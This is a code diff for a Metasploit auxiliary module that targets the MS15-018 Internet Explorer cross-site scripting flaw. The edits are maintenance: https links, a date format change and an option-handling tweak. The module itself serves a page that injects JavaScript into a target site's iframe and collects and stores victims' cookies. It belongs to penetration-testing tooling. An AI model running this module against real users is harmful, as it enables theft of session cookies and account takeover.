@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer
 
   def initialize(info={})
@@ -33,17 +30,17 @@ class MetasploitModule < Msf::Auxiliary
           [ 'OSVDB', '117876' ],
           [ 'MSB', 'MS15-018' ],
           [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Feb/10' ]
+          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Feb/10' ]
         ],
       'Platform'       => 'win',
-      'DisclosureDate' => "Feb 1 2015"
+      'DisclosureDate' => '2015-02-01'
     ))
 
     register_options(
     [
       OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
       OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
-    ], self.class)
+    ])
   end
 
   def setup
@@ -81,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       host = "[#{host}]"
     end
 
-    if datastore['URIPORT'] != 0
+    if datastore['URIPORT']
       port = ':' + datastore['URIPORT'].to_s
     elsif (ssl and datastore["SRVPORT"] == 443)
       port = ''
@@ -142,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
         report_note(
           :host => cli.peerhost,
           :type => 'ie.cookie',
-          :data => data
+          :data => { :cookie => data }
         )
         path = store_loot('ie_uxss_cookie', "text/plain", cli.peerhost, data, "#{cli.peerhost}_ie_cookie.txt", "IE Cookie")
         vprint_good("Cookie stored as: #{path}")
@@ -152,5 +149,4 @@ class MetasploitModule < Msf::Auxiliary
       send_response(cli, get_html)
     end
   end
-
 end
